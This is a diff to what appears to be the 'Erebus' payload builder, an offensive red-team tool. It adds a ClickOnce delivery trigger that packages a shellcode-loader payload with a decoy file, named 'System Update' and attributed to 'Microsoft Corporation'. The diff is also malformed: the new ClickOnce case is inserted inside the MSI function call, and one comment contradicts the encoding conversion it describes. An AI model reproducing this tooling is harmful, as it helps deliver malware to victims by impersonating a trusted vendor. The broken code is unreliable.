@@ -20,6 +20,7 @@ from erebus_wrapper.erebus.modules.container_msi import (
 from erebus_wrapper.erebus.modules.trigger_lnk import create_payload_trigger
 from erebus_wrapper.erebus.modules.trigger_bat import create_bat_payload_trigger
 from erebus_wrapper.erebus.modules.trigger_msi import create_msi_payload_trigger
+from erebus_wrapper.erebus.modules.trigger_clickonce import create_clickonce_trigger
 from erebus_wrapper.erebus.modules.container_archive import build_7z, build_zip
 from erebus_wrapper.erebus.modules.container_iso import build_iso
 from erebus_wrapper.erebus.modules.codesigner import self_sign_payload, get_remote_cert_details, sign_with_provided_cert
@@ -264,7 +265,7 @@ If one is not uploaded then an example file will be used.""",
             name="0.11 Trigger Type",
             parameter_type=BuildParameterType.ChooseOne,
             description="Type of Trigger to toggle decoy and execution",
-            choices=["LNK", "BAT", "MSI"],
+            choices=["LNK", "BAT", "MSI", "ClickOnce"],
             default_value="LNK",
             required=False,
         ),
@@ -776,7 +777,6 @@ generated if none have been entered.""",
     async def containerise_payload(self,agent_build_path):
         """Creates a container and adds all files generated from the payload function inside of the given archive/media"""
 
-        trigger_type = self.get_parameter("0.11 Trigger Type")
         target_ext = f".{self.get_parameter('0.11 Trigger Type').lower()}"
 
         match(self.get_parameter("3.0 Container Type")):
@@ -1227,6 +1227,37 @@ generated if none have been entered.""",
                         ))
                         return response
 
+                    # Convert resource file to UTF16
+                    cmd = [
+                        "iconv",
+                        "-f",
+                        "UTF-16LE",
+                        "-t",
+                        "UTF-8",
+                        f"{shellcode_loader_path}/Erebus.Loader.rc",
+                    ]
+
+                    resource_file = subprocess.check_output(cmd, text=True)
+                    with open(f"{shellcode_loader_path}/Erebus.Loader.utf8.rc", "w") as file:
+                        file.write(resource_file)
+
+                    cmd = [
+                        "mv",
+                        f"{shellcode_loader_path}/Erebus.Loader.utf8.rc",
+                        f"{shellcode_loader_path}/Erebus.Loader.rc",
+                    ]
+                    process = await asyncio.create_subprocess_exec(
+                        *cmd,
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE,
+                    )
+                    stdout, stderr = await process.communicate()
+
+                    if stdout:
+                        output += f"[stdout]\n{stdout.decode(errors='replace')}"
+                    if stderr:
+                        output += f"[stderr]\n{stderr.decode(errors='replace')}"
+
                     # Compile Loader
                     cmd = [
                         "make",
@@ -1427,6 +1458,7 @@ generated if none have been entered.""",
                   # Prefer exe if present, else fall back to dll (non-Windows publish may omit host exe)
                     clickonce_exe = publish_dir / "Erebus.ClickOnce.exe"
                     clickonce_dll = publish_dir / "Erebus.ClickOnce.dll"
+                    clickonce_application = publish_dir / "Erebus.ClickOnce.application"
 
                     payload_dir = Path(agent_build_path) / "payload"
                     payload_dir.mkdir(parents=True, exist_ok=True)
@@ -1443,6 +1475,11 @@ generated if none have been entered.""",
                             except:
                                 # If not on Windows or ctypes fails, silently continue
                                 pass
+
+                    # Log available files
+                    output += f"[DEBUG] Contents of publish_dir:\n"
+                    for item in publish_dir.iterdir():
+                        output += f"  - {item.name}\n"
 
                     if clickonce_exe.exists():
                         shutil.move(str(payload_dir / "Erebus.ClickOnce.exe"), payload_path)
@@ -1640,6 +1677,15 @@ generated if none have been entered.""",
 
                         case "MSI":
                             trigger_path= create_msi_payload_trigger(
+
+                                                        case "ClickOnce":
+                                                            trigger_path = await create_clickonce_trigger(
+                                                                payload_exe="erebus.exe",
+                                                                payload_dir=payload_dir,
+                                                                decoy_file=decoy_file,
+                                                                app_name="System Update",
+                                                                app_publisher="Microsoft Corporation"
+                                                            )
                                 payload_exe="erebus.exe",
                                 payload_dir=payload_dir,
                                 decoy_file=decoy_file
